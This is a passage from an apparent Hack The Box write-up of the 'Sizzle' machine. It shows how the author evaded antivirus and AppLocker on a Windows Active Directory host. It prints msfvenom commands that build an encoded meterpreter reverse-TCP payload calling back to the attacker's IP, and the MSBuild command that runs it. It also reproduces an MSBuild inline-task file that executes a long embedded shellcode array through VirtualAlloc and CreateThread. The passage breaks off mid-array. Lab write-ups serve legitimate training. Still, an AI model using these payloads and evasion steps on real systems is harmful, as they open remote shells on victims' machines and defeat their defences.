&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-were-even-in-constrained-language-mode-in-powershell-&quot;&gt;We were even in Constrained Language Mode in PowerShell :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;since-this-was-an-active-directory-environment-i-wanted-to-do-kerberoasting-but-invoke-kerberoastps1-needed-full-language-mode-i-couldnt-use-getuserspnspy-because-the-services-were-internal-only-and-my-attempts-to-evade-the-antivirus-failed-i-could-bypass-the-constrained-language-mode-with-psbypassclm-and-still-couldnt-use-invoke-kerberoastps1-applocker-is-easy-to-bypass-so-it-wasnt-an-issue-but-i-had-to-bypass-the-antivirus&quot;&gt;Since this was an Active Directory environment I wanted to do kerberoasting, but &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Kerberoast.ps1&lt;/code&gt; needed Full Language Mode, I couldn’t use &lt;code class=&quot;highlighter-rouge&quot;&gt;GetUserSPNs.py&lt;/code&gt; because the services were internal only. And my attempts to evade the antivirus failed. I could bypass the constrained language mode with &lt;a href=&quot;https://github.com/padovah4ck/PSByPassCLM&quot;&gt;PSByPassCLM&lt;/a&gt; and still couldn’t use &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Kerberoast.ps1&lt;/code&gt;. AppLocker is easy to &lt;a href=&quot;https://github.com/api0cradle/UltimateAppLockerByPassList&quot;&gt;bypass&lt;/a&gt; so it wasn’t an issue. But I had to bypass the antivirus.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;bypassing-av&quot;&gt;Bypassing AV&lt;/h3&gt;
&lt;h4 id=&quot;i-found-this-article-and-this-poc&quot;&gt;I found &lt;a href=&quot;https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/&quot;&gt;this article&lt;/a&gt; and this &lt;a href=&quot;https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml&quot;&gt;POC&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;first-time-i-created-the-payload-like-this-&quot;&gt;First time I created the payload like this :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1339 -f csharp&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-i-added-the-shellcode-to-the-poc-and-applied-the-exploit-&quot;&gt;And I added the shellcode to the POC and applied the exploit :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\windows\system32\spool\drivers\color\shellcode.xml&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-antivirus-detected-it-i-added-an-encoder-and-100-iterations-and-tried-again-&quot;&gt;The antivirus detected it. I added an encoder and 100 iterations and tried again :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1339 -e x86/shikata_ga_nai -i 100 -f csharp&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-added-the-shellcode-to-shellcodexml&quot;&gt;Then I added the shellcode to &lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode.xml&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;shellcodexml-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode.xml&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;Project ToolsVersion=&quot;4.0&quot; xmlns=&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;&amp;gt;
  &amp;lt;!-- This inline task executes shellcode. --&amp;gt;
  &amp;lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&amp;gt;
  &amp;lt;!-- Save This File And Execute The Above Command --&amp;gt;
  &amp;lt;!-- Author: Casey Smith, Twitter: @subTee --&amp;gt; 
  &amp;lt;!-- License: BSD 3-Clause --&amp;gt;
  &amp;lt;Target Name=&quot;Hello&quot;&amp;gt;
    &amp;lt;ClassExample /&amp;gt;
  &amp;lt;/Target&amp;gt;
  &amp;lt;UsingTask
    TaskName=&quot;ClassExample&quot;
    TaskFactory=&quot;CodeTaskFactory&quot;
    AssemblyFile=&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot; &amp;gt;
    &amp;lt;Task&amp;gt;
    
      &amp;lt;Code Type=&quot;Class&quot; Language=&quot;cs&quot;&amp;gt;
      &amp;lt;![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport(&quot;kernel32&quot;)]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport(&quot;kernel32&quot;)]
            private static extern IntPtr CreateThread(            
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId           
            );
          [DllImport(&quot;kernel32&quot;)]
            private static extern UInt32 WaitForSingleObject(           
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );          
          public override bool Execute()
          {
            byte[] shellcode = new byte[3189] {
0xb8,0xfe,0x59,0x88,0xe3,0xdd,0xc6,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0x66,
0xb9,0x17,0x03,0x31,0x43,0x14,0x83,0xc3,0x04,0x03,0xbd,0x49,0x6a,0x16,0xfb,
0x0b,0x0e,0xdf,0x65,0x10,0x07,0x06,0xed,0x83,0x6c,0xe6,0x24,0x05,0xea,0xa0,
0x39,0x96,0x70,0x15,0x41,0xa9,0x21,0x89,0x4a,0x9e,0xde,0x4f,0xd8,0x9d,0x21,
0xc8,0xc2,0xc7,0x98,0x1a,0x36,0x5c,0xec,0xe2,0xa0,0x84,0x61,0x2a,0x53,0xe7,
0x00,0x93,0xe2,0x70,0x85,0x85,0xda,0x7c,0xc7,0xc4,0x6e,0x4c,0xba,0xc5,0x5c,
0x9f,0x56,0x88,0x1d,0x4a,0xcb,0x5a,0x6f,0x86,0x40,0x46,0x26,0x80,0xf3,0x06,
0x39,0x4e,0xc2,0x43,0x48,0x82,0x98,0x06,0xa1,0x6b,0x45,0xbb,0x79,0xeb,0x4f,
0x4f,0x57,0x2f,0x6e,0x01,0xbc,0x9f,0x7b,0x2b,0xee,0x21,0x0c,0x5e,0x01,0xcf,
0xbb,0x1e,0x12,0x2f,0xf2,0xa7,0x1f,0x9c,0xa5,0x95,0x57,0x21,0x77,0xe6,0x03,
0x16,0x5a,0x09,0x8a,0x0b,0xb6,0x9f,0x70,0x88,0x1a,0xe7,0xae,0xdb,0xd4,0xc0,
0x3f,0xcd,0x53,0x49,0x21,0x97,0x7d,0xce,0xca,0x85,0xd8,0x94,0x12,0x73,0x81,
0x13,0xda,0x63,0xcf,0xa8,0x77,0xfa,0xa4,0x96,0xc8,0x18,0x2a,0xad,0x04,0xa8,
0x56,0xfc,0x6c,0x89,0xef,0x15,0xff,0xc1,0xa5,0x4b,0xb4,0xa4,0x3c,0xbc,0xf6,
0xeb,0x10,0x99,0xaa,0x81,0x73,0x33,0x5d,0xc9,0x5c,0x71,0x8f,0x45,0x30,0x6e,
0x8b,0x3a,0xc2,0x2d,0x09,0x7e,0x0f,0x34,0xea,0xb5,0x4b,0xfd,0x39,0x97,0x8b,
0xe1,0xb8,0x31,0xaa,0xe9,0xe1,0x0c,0x0f,0xda,0x49,0x1b,0xfd,0xf4,0x82,0x3c,
0x80,0x00,0x81,0x42,0x30,0xdf,0xe4,0x9f,0x9f,0xa9,0xa7,0x6e,0x27,0xe5,0x32,
0xf6,0x4b,0x90,0x52,0xb7,0x53,0xa2,0x5a,0xc2,0x47,0xdf,0x10,0x67,0x38,0xab,
0xbe,0x8b,0x34,0xa1,0x86,0x39,0x3e,0x16,0x6c,0xbc,0xcf,0x4f,0x17,0x30,0x1d,
0xa7,0x55,0x35,0x8b,0x51,0xeb,0xdc,0x78,0xac,0xed,0x41,0x75,0xdb,0x91,0x08,
0x4b,0x0f,0x32,0xd6,0x0c,0x16,0xa5,0xca,0x80,0xd3,0xad,0x44,0x7d,0x86,0x09,
0xf1,0xcd,0x9c,0x65,0x7c,0xff,0xc7,0x2b,0x90,0xa6,0xd0,0x38,0xb1,0x57,0x7f,
0xcb,0x98,0xec,0xee,0x22,0x96,0x5f,0xcf,0xca,0x2e,0x1f,0x2e,0x6a,0x63,0x27,
0x74,0xc2,0xe1,0xed,0x8c,0x87,0x98,0x2e,0xb6,0x9f,0x28,0x64,0x07,0xa7,0xda,
0x51,0x56,0x05,0xa5,0x4e,0xcf,0xd5,0x9a,0x39,0x76,0x51,0x2c,0xd3,0x32,0xbf,
0x47,0x5d,0xee,0xa6,0xd9,0xa1,0x6c,0xd6,0x73,0x5f,0x76,0x63,0x14,0xcf,0xb2,
0x6f,0x66,0x82,0xe7,0x96,0xdf,0x25,0x21,0x24,0x12,0x71,0x68,0x42,0xf1,0xdd,
0xa9,0x8a,0xe0,0xd4,0xaa,0x4e,0x10,0x68,0xe0,0x84,0x76,0xe0,0xf4,0x63,0x93,
0x74,0x1c,0xa6,0x4d,0x27,0x5b,0x79,0xfd,0x82,0x64,0x0a,0xbd,0xf0,0x37,0xf1,
0xd3,0xb7,0x7f,0x0a,0x39,0x8f,0x26,0x24,0x1f,0x4b,0xc4,0x34,0x73,0xc2,0xd1,
0xab,0x70,0x2d,0x65,0x6b,0x1c,0x1c,0x9f,0x9e,0xaf,0x13,0xbb,0xef,0x1c,0x9d,
0x64,0x53,0x39,0x17,0x00,0x0d,0x69,0x4b,0x3f,0x21,0x2f,0x7c,0xcb,0xe3,0xf7,
0x53,0x75,0xc2,0xa2,0x26,0x58,0xc5,0x37,0x94,0x32,0xc1,0x4d,0xa0,0x67,0xa3,
0xad,0x16,0x0d,0xd7,0xd8,0x85,0x78,0xc3,0xcf,0x4c,0x2b,0x95,0x45,0x2c,0xbf,
0x60,0x2b,0x26,0x49,0x29,0xbc,0xa6,0xce,0xde,0xed,0xf3,0x01,0x41,0xee,0xa1,
0xbd,0x05,0x2d,0xd7,0x7e,0xd7,0xcc,0xd9,0x22,0x2e,0x0d,0x22,0x51,0xc5,0xfa,
0x6c,0x6c,0xfa,0xab,0x0e,0x2f,0x3a,0x01,0xdc,0x2d,0xaa,0xf8,0x3d,0x88,0xd4,
0xfe,0xa0,0xd5,0x19,0x7c,0x76,0x0d,0x87,0xd1,0x4d,0x50,0x4a,0x48,0xd2,0xd1,
0xcf,0x38,0xbb,0xac,0xf4,0xd2,0x8a,0x2a,0x1e,0x0a,0x5b,0x84,0xdd,0x4a,0x70,
0x16,0xaa,0x0d,0x9d,0xb3,0xc1,0x6f,0x8d,0x36,0x7d,0xd0,0xec,0x19,0xd1,0xcb,
0x8b,0x93,0xd4,0x27,0x3e,0x8d,0x01,0x02,0xb8,0x49,0x7f,0xb5,0x70,0xeb,0xa9,
0xe9,0xc5,0xf1,0xac,0x08,0xab,0x3d,0xfa,0xa5,0x07,0x31,0x03,0x33,0x00,0xf9,
0xf6,0x12,0xfb,0x10,0x59,0x64,0x60,0x81,0xf5,0x60,0xf7,0x14,0xd9,0xdf,0x72,
0xe2,0x20,0xfb,0x4a,0x1d,0xf1,0x58,0x1b,0x12,0x36,0x2d,0x3c,0x8d,0xc0,0xa8,
0x28,0x57,0x0b,0x9b,0x1c,0x05,0x26,0x07,0x86,0xe2,0x85,0x8a,0xa1,0x6a,0x6d,
0x28,0x0f,0x18,0x84,0x0f,0xe1,0xf2,0xff,0x32,0xab,0x0c,0x12,0x33,0x5b,0xca,
0x72,0x4b,0x9e,0x14,0x2d,0xeb,0x59,0xed,0x4f,0x3b,0xef,0x43,0x7c,0x99,0xdc,
0x08,0x35,0x76,0x45,0xd9,0x16,0x76,0xc6,0xb7,0x7f,0xa4,0xaf,0x03,0x87,0x91,
0x27,0x10,0x9b,0x99,0x2b,0xb3,0xe1,0xca,0x5d,0xee,0x45,0x60,0x34,0x44,0x2c,
0x1c,0x9c,0x5e,0x13,0x15,0x16,0x50,0x56,0xec,0x17,0xd7,0x38,0xaa,0xb3,0x2c,
0xc5,0xea,0x32,0x7e,0x25,0x1f,0xd6,0x95,0x1d,0xa3,0x44,0xbf,0x8c,0x53,0x3b,
0x06,0xcf,0x1a,0x46,0x75,0x54,0x01,0x76,0x39,0x33,0x7a,0x55,0x5a,0x48,0xe5,
0xe4,0xad,0x6c,0x65,0x6b,0x12,0x2a,0xe7,0xbe,0x8f,0x4f,0x33,0x19,0xd4,0x31,
0xac,0x4f,0x11,0xcc,0x18,0xe7,0x61,0x44,0x7b,0xa8,0x9c,0x6b,0xd1,0xdf,0x35,
0xb1,0xbf,0x15,0x78,0x57,0x02,0x73,0x92,0x23,0x32,0x92,0xb1,0xe6,0xe4,0x2d,
0x09,0x42,0xea,0xcd,0x05,0x3e,0x04,0xe7,0x83,0xc0,0xfa,0x89,0x68,0x0c,0x49,
0xec,0x8f,0x42,0x88,0xe5,0xbe,0xbe,0xe2,0x09,0xc1,0x0f,0x60,0xb7,0x7f,0x47,
0xf1,0xc8,0x7c,0xbf,0x22,0x8d,0x28,0x5b,0x0d,0x1f,0xb4,0xa9,0x46,0xea,0x5c,
0x48,0x0a,0x00,0x66,0xc6,0x55,0xcc,0x7e,0x34,0xe7,0x19,0xd3,0x77,0x95,0x8c,
0x0d,0x2d,0x47,0x3a,0xb5,0x79,0x14,0x92,0x80,0xd2,0xb4,0x8a,0xad,0x1b,0x7a,
0x94,0xa2,0x5a,0xc1,0x95,0xf0,0x0b,0x7d,0x75,0x6e,0x2f,0x34,0x3f,0x2f,0xeb,
0xca,0x4e,0x35,0x71,0x5f,0x41,0x45,0x0f,0x76,0x3f,0x13,0x67,0xe3,0x73,0xba,
0xb0,0xa5,0x92,0x44,0x32,0x0d,0x61,0x2b,0xee,0x57,0xef,0x76,0xeb,0xd5,0x99,
0x92,0xff,0xec,0xf5,0x88,0xa0,0xd3,0xfc,0xec,0xbf,0xcd,0x31,0xf3,0x40,0x63,
0xeb,0xc8,0xc6,0x74,0xc1,0xe5,0xf3,0xf2,0x1a,0x21,0x5f,0xef,0x8a,0x3c,0x3e,
0x96,0x78,0xb7,0xdf,0xc2,0x4c,0xf3,0x73,0xee,0x5d,0xe6,0x28,0x93,0xe4,0xd5,
0x8f,0x03,0xf7,0xe9,0x62,0x17,0xfc,0xec,0x5e,0x7e,0xc7,0x52,0x10,0x8a,0x0d,
0x21,0xf8,0xd2,0x4e,0x74,0xbe,0x8c,0x6b,0x15,0x28,0xa7,0x41,0xc5,0x74,0x15,
0x1d,0xa5,0x33,0x8a,0x06,0xa1,0x93,0xc0,0xe9,0x8a,0x62,0x1c,0x45,0x63,0xaa,
0xd6,0x09,0x8d,0xd6,0xd9,0xac,0x2f,0x98,0xcc,0xdc,0xa2,0x11,0x5e,0x39,0xb6,
0xcf,0x00,0xc9,0xb1,0x55,0xad,0x39,0x0a,0xb3,0xa1,0x66,0x43,0x8f,0x5d,0xbd,
0x57,0x37,0xc8,0xb2,0xa9,0x05,0xe2,0xaa,0xa7,0x6c,0x48,0xce,0x31,0x91,0xd6,
0x04,0xb9,0x7b,0xcd,0xe0,0x6d,0x82,0x16,0x8e,0x4b,0x20,0x87,0x82,0x00,0x37,
0x3e,0xf0,0x31,0x27,0xe4,0xd2,0xa8,0x90,0x54,0x99,0x98,0xaa,0xab,0xea,0x08,
0xad,0xa6,0xf9,0x18,0x57,0x52,0xdf,0xa6,0xf0,0x0c,0x5b,0xa8,0x6a,0xed,0x18,
0xd8,0x0d,0x41,0x42,0x7d,0x30,0x4d,0x73,0x8b,0x1b,0x3a,0x10,0xb8,0xcf,0x8d,
0x55,0xbb,0x25,0x1e,0x2f,0x15,0xc6,0x7b,0x64,0x64,0x99,0x3e,0xc7,0x1c,0xb1,
0xf8,0x18,0x26,0x5e,0x42,0xeb,0x20,0xbd,0xcb,0x55,0x00,0x8a,0xe0,0x83,0xa0,
0x81,0xd5,0x92,0x50,0xcb,0x79,0x40,0xde,0x15,0x1c,0x19,0x32,0x3b,0xc2,0x3a,
0x98,0x1a,0x07,0x92,0xbc,0x49,0x4a,0x93,0x55,0xf2,0x31,0x73,0x80,0x2a,0x92,
0x25,0xf4,0xac,0xeb,0xc8,0xe6,0x9b,0x08,0x9c,0x8a,0x51,0x64,0x4c,0xd0,0x22,
0x88,0x0e,0xba,0x96,0x7e,0x6a,0x45,0x7b,0x3d,0x78,0xfe,0xd1,0xdd,0x25,0x4c,
0x50,0xa1,0x24,0x55,0xae,0x7d,0xe7,0x2f,0xbd,0xb8,0x82,0x6e,0xe8,0x97,0x1a,
0x56,0x3f,0x52,0x42,0xc6,0x07,0x66,0x32,0xf8,0x60,0xe5,0x91,0x98,0x30,0x3b,
0x2a,0xe9,0x47,0xb0,0x04,0x65,0x6a,0x8d,0x55,0xac,0x60,0xe2,0xd6,0xc6,0x68,
0x26,0xfe,0x18,0x5b,0x3c,0xe2,0x6b,0x20,0x40,0x31,0x05,0xd1,0xec,0x84,0x2c,
0x60,0x31,0xce,0x4a,0x77,0xcb,0xec,0x95,0x88,0x78,0x0b,0x12,0x71,0x9f,0x98,
0x91,0x67,0x8d,0xb1,0x29,0xab,0xb4,0xd7,0xb8,0x73,0x67,0xa2,0x3f,0xc8,0xcf,
0x3b,0x5c,0xbd,0x62,0x69,0x6b,0x41,0x59,0x0c,0x05,0xae,0xb2,0xf3,0xb4,0xe4,
0x66,0x60,0x9f,0xa3,0xb6,0x90,0xb8,0xe6,0x1a,0x19,0xa5,0x99,0x22,0xcf,0xca,
0xa5,0xe9,0xc1,0x64,0x30,0xce,0x4f,0x85,0xfe,0x7f,0xe4,0x0a,0x07,0xa0,0x58,
0xcb,0x5e,0xcf,0x26,0x03,0xac,0x71,0x0e,0xdd,0x1c,0x0d,0x32,0xa5,0x9f,0x44,
0x2f,0xeb,0xfd,0xad,0x69,0x5c,0x29,0x11,0x72,0x1b,0xd7,0x48,0xea,0x40,0xd3,
0xc0,0x4d,0xc2,0x22,0x15,0x9b,0x33,0x64,0x47,0xab,0x90,0x22,0x90,0x0b,0x01,
0x12,0x87,0x40,0x76,0x18,0x3f,0xec,0x40,0xd3,0xba,0x86,0xc6,0x76,0x3d,0xbb,
0xc9,0x2c,0x5a,0x32,0x23,0x56,0x46,0x00,0xdc,0x8e,0x00,0x4c,0xe0,0x1a,0x04,
0xd5,0x04,0x1b,0xee,0xc5,0x90,0x2d,0x9f,0x68,0xf5,0x11,0x48,0xcf,0x2d,0x85,
0xef,0xe9,0x2b,0xc8,0x3f,0xf3,0x07,0x12,0xd7,0x23,0x93,0x5f,0x2d,0xab,0xe3,
0x9a,0x37,0x42,0xf1,0xd2,0x7e,0xdc,0x6c,0x30,0x35,0x75,0xf6,0x1a,0x1c,0x8f,
0x59,0x92,0x38,0xc7,0xb7,0x05,0xbd,0x76,0x31,0x21,0x6f,0x4c,0x6f,0x54,0xde,
0x5e,0x4a,0xb0,0x1d,0xec,0xcb,0xd2,0x13,0x28,0xcc,0xf7,0xd8,0x13,0xac,0xcf,
0x03,0x34,0xd7,0x4d,0xa2,0xdf,0x21,0x84,0x1d,0xf5,0xcc,0x64,0x8f,0x97,0xd7,
0x2b,0xa2,0x89,0xb4,0x6e,0x8d,0xb0,0x0b,0xc0,0x09,0x43,0xa2,0xbe,0x97,0xe5,
0x1d,0x58,0xe0,0x3f,0xb5,0xe5,0xe2,0xc0,0x3a,0x8e,0x2e,0xfc,0x90,0x2a,0x06,
0xaa,0xe4,0x97,0x53,0x70,0x70,0xa4,0xf2,0xce,0x8f,0x11,0x57,0x05,0xe4,0x39,
0x4c,0xf2,0x7b,0x1a,0x45,0xd1,0xce,0xc9,0xf4,0x20,0xf2,0xbd,0x13,0xdf,0xc2,
0x65,0xd0,0x5c,0x4e,0x77,0xe4,0x59,0x3d,0xa5,0xb5,0x8b,0x05,0x6d,0x9d,0x61,
0x72,0x17,0xde,0x9c,0xfd,0x4d,0x30,0x8a,0x51,0xa8,0xf6,0x47,0x85,0xff,0x7e,
0x74,0x88,0x8b,0x10,0xa1,0xee,0xaf,0xef,0xb5,0x53,0xe2,0x5c,0x36,0x8a,0x54,
0xa0,0xf5,0xd0,0x4b,0x5f,0x0e,0x74,0x49,0x72,0x9e,0xc5,0x66,0xbd,0xca,0x2d,
0x20,0x16,0x16,0x1c,0x83,0x59,0x08,0xbb,0x5b,0x1d,0x8f,0x91,0xda,0xb5,0xa7,
0xe6,0xda,0xb7,0xfb,0x8a,0x32,0xc3,0x2f,0x73,0xe0,0x27,0x4c,0x07,0x19,0x49,
0xf8,0x55,0xba,0x69,0x64,0xf9,0xad,0xd5,0x2a,0xa5,0xab,0xfd,0x3b,0x5c,0x7d,
0x73,0xc7,0xf9,0x65,0x62,0xc3,0xc6,0xd7,0x3f,0x10,0x9e,0x0d,0x35,0x52,0xb7,
0x4e,0x17,0xdf,0x7d,0x59,0x47,0xfb,0xf1,0x02,0x58,0x25,0xf6,0xe9,0x59,0x9c,
0xf6,0x70,0xc4,0x19,0x66,0x01,0x81,0xb5,0xde,0x7a,0x28,0xbf,0x45,0x66,0xc5,
0x96,0x7e,0x55,0x09,0x21,0x58,0x7c,0xcf,0x34,0x66,0x67,0x9e,0xd3,0x55,0x63,
0x3f,0x01,0x1f,0x14,0x42,0x4b,0x29,0xca,0x89,0x27,0xc7,0x0f,0x77,0xb0,0xe6,
0x13,0x3d,0x37,0x15,0xc0,0x2b,0x5e,0x40,0x20,0x86,0x30,0x0d,0xc5,0x46,0x98,
0xab,0xb0,0x2b,0x92,0xc5,0x22,0x21,0x92,0xf6,0x1c,0x03,0x27,0x0a,0x7c,0x84,
0x4b,0x54,0x0a,0xf3,0x6e,0xc6,0x50,0xe5,0xf6,0x28,0x9b,0x7d,0xa5,0xa3,0x21,
0x75,0xaa,0xb0,0xd7,0xf3,0xa0,0xa5,0xd0,0x7f,0x90,0x75,0xf1,0x16,0x8b,0x98,
0x70,0x15,0x5a,0xc5,0x58,0x38,0xc1,0xaf,0x87,0xbb,0xce,0x65,0x2f,0x6d,0xb1,
0x2d,0x69,0x47,0x4d,0x34,0xf9,0x02,0xb9,0x66,0x4f,0x93,0xe2,0x7c,0x26,0x76,
0x01,0x12,0x1e,0x86,0x81,0x69,0x8d,0xa5,0x31,0x67,0x1b,0x61,0x5b,0x02,0xb4,
0x21,0xa9,0x70,0xbe,0xbb,0x23,0x22,0x6d,0x1d,0xc8,0x19,0x23,0x41,0xfc,0x6c,
0x41,0x12,0x17,0xbf,0x99,0x4e,0x9c,0xc2,0x5c,0x18,0xbf,0xcc,0x1a,0xb4,0x2d,
0x9e,0x26,0xa5,0x7d,0x1e,0xdc,0x50,0x1f,0xd9,0x0a,0x79,0xf3,0x29,0x16,0xb6,
0x49,0xda,0x55,0x51,0xc9,0x54,0x2e,0x46,0x68,0x9b,0xec,0x3b,0xd4,0x61,0x27,
0x50,0x3a,0x47,0x74,0x62,0x07,0x0f,0x83,0xcd,0xc2,0x26,0x20,0xb7,0xa3,0xd7,
0x0e,0xa6,0x6c,0xfd,0xb0,0x2f,0xd5,0x0f,0x6f,0x35,0x5d,0x4f,0x2b,0x14,0xe7,
0xca,0x6f,0x78,0x0e,0xfb,0x09,0x5c,0x25,0x0c,0x99,0xc4,0xa5,0x92,0x30,0x3e,
0xbb,0x4c,0x46,0xa9,0xa0,0xe6,0xf0,0x75,0x12,0xad,0x6c,0xc1,0xef,0xcc,0xf2,
0x67,0x5f,0x22,0xff,0xa1,0x53,0xad,0xc5,0x57,0x8b,0xcc,0x0a,0xd5,0x94,0xa8,
0x91,0x41,0xc2,0x47,0xd5,0xa1,0x27,0x1f,0x0b,0x47,0x2d,0xa8,0xf4,0xc6,0xdb,
0x5d,0x17,0x36,0x44,0x23,0x26,0x30,0xa8,0xd6,0x97,0x93,0xf2,0x48,0x7c,0x34,
0xbd,0x94,0xb9,0xa2,0x5e,0x78,0x66,0xde,0xbf,0x31,0x7e,0x5a,0x7f,0xbc,0xe9,
0xaa,0x7a,0x00,0xaa,0x8f,0xc8,0x15,0x65,0x84,0x6c,0x1e,0x95,0x43,0xc3,0x82,
0x0a,0x65,0x16,0x73,0xe3,0x47,0xe6,0xfa,0x62,0x80,0x9f,0xa9,0x28,0x8c,0x4c,
0xbd,0xe2,0xbb,0x82,0x8b,0xd1,0x80,0x00,0x84,0x6d,0x8d,0x80,0x4e,0x7d,0xce,
0x84,0x91,0x94,0x74,0x8c,0x30,0xc9,0x49,0x59,0x7b,0x9c,0x0d,0x06,0x60,0x3d,
0x12,0xaf,0x55,0x33,0x12,0x51,0xcb,0x05,0x53,0x8b,0x29,0xcb,0xd5,0xd2,0x00,
0xc7,0x73,0xda,0x2a,0x5a,0x6d,0x34,0xed,0x5d,0x61,0xec,0xb0,0xe6,0x0a,0x23,
0x61,0xa9,0xd5,0x1d,0x97,0x01,0x0b,0x98,0xfe,0x8b,0xad,0x16,0x2e,0x96,0x87,
0xd8,0x86,0xc3,0x46,0xeb,0xd0,0x41,0x6c,0x10,0xa4,0xd2,0xdf,0x07,0x4e,0x7f,
0x65,0x66,0x99,0x40,0x5f,0xdb,0x8d,0x85,0xd4,0x0d,0x1a,0xe3,0x5f,0x3a,0x38,
0x5c,0x4e,0xeb,0xa1,0x5a,0xfc,0x46,0x78,0xc6,0xa6,0x3d,0x6a,0x04,0x2a,0x07,
0xf5,0x3d,0xac,0x08,0xe9,0x22,0x13,0xa9,0x75,0x78,0x81,0xd1,0x3c,0x93,0x4b,
0x44,0x18,0x8b,0xfa,0xef,0xa2,0xb4,0x91,0x52,0xae,0x4b,0xae,0xf2,0x8e,0xdf,
0xac,0x96,0xf1,0xde,0x18,0x40,0x5f,0x13,0x5c,0xe6,0xa8,0x39,0x04,0x05,0x00,
0x53,0xfb,0x69,0x4c,0x93,0x0a,0x88,0x25,0x28,0xbc,0xdd,0xde,0xc6,0xcf,0x55,
0x7e,0x7b,0xef,0x95,0x34,0x6b,0x0d,0x04,0x4d,0x02,0xd9,0x6e,0x86,0xce,0xf0,
0x2d,0xd8,0x79,0x68,0xde,0x1c,0xe7,0xf5,0xc4,0x94,0x38,0xc4,0x6a,0xdd,0x2a,
0x37,0x7c,0xfe,0x42,0x2a,0x5d,0xf3,0xae,0xeb,0x09,0x99,0xfa,0x52,0xc4,0x9c,
0x67,0xd7,0x33,0x8b,0x3d,0xc3,0xa3,0x95,0x5d,0x3c,0x83,0x3b,0xcf,0x23,0x25,
0x7f,0xbe,0x42,0x11,0xb8,0x44,0xba,0xf5,0xf7,0xfa,0x76,0xfb,0xe8,0xc5,0x74,
0xa8,0x7e,0x5b,0xef,0xa7,0x98,0x54,0x6f,0x81,0x5f,0x72,0x9f,0x89,0xc1,0xcc,
0x7d,0x93,0xa8,0xee,0x2c,0x41,0x8f,0x09,0xbe,0x3f,0x9e,0xc5,0x9c,0x73,0xaf,
0xe3,0x38,0x67,0x5e,0xa8,0x01,0xd7,0xce,0x5b,0xcb,0x63,0xfc,0x11,0x52,0xbc,
0x5e,0xc8,0xa6,0x79,0x54,0x65,0xf0,0xcf,0xe0,0x10,0xbd,0x90,0x4f,0x89,0xde,
0xd0,0x8c,0xbd,0xbb,0x61,0x46,0xd6,0x5e,0xff,0x90,0x32,0x77,0x0a,0xb4,0x7f,
0x84,0xee,0xbc,0x91,0x62,0x12,0x9d,0x29,0x02,0xcd,0x64,0x3a,0x35,0x06,0x49,
0x4d,0xa3,0xe5,0x00,0x88,0x5f,0xc0,0xa3,0x07,0xcb,0xc7,0x61,0x1b,0x36,0x19,
0x0e,0xe3,0x28,0x35,0x8e,0xa2,0xc3,0xc0,0xa1,0xc9,0x50,0x34,0xe8,0xb4,0x85,
0x9a,0x8d,0x12,0xe3,0x4d,0xaa,0xcb,0x5c,0x5c,0xc8,0xe2,0xcb,0xe9,0x44,0x68,
0x3a,0x82,0x1c,0x53,0xf6,0x54,0xab,0xda,0x85,0xb8,0x9e,0x3a,0xd8,0xce,0x33,
0x13,0xc4,0x24,0xed,0x99,0x83,0xfb,0xb0,0x90,0x63,0xc2,0xa8,0x97,0xbc,0x40,
0xe7,0xc9,0x6d,0x17,0x58,0x54,0xf6,0x72,0x63,0x3a,0x41,0x43,0xe3,0xa6,0xbc,
0x2d,0xd3,0xe0,0x0c,0x9a,0x10,0xcf,0x7a,0x3c,0xad,0xcf,0x6b,0x39,0xb2,0x74,
0x3e,0xef,0xd9,0xc7,0xe7,0x2e,0x46,0x7e,0xb8,0xd6,0x2a,0x54,0x47,0x59,0x0c,
